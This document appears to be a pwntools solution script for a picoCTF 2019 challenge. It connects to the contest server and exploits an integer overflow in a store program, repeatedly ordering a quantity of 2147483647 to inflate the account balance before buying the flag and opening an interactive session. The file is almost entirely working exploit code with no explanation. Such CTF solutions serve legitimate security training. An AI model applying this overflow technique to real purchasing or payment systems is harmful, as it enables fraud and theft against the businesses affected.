#!/usr/bin/env python

from pwn import *

#context.log_level = 'error'

p = remote('2019shell1.picoctf.com', 11177)

resp = 0
while resp < 100000:
	p.sendlineafter('selection\n', '2')
	p.sendlineafter('Currently for sale\n', '1')
	p.sendlineafter('quantity\n', '2147483647')
	p.recvuntil('Your current balance after transaction: ')
	resp = int(p.recvuntil('\n'))
	log.info('Account Balance: '+str(resp))

p.sendlineafter('selection\n', '2')
p.sendlineafter('Currently for sale\n', '2')
p.sendlineafter('one', '1')
p.interactive()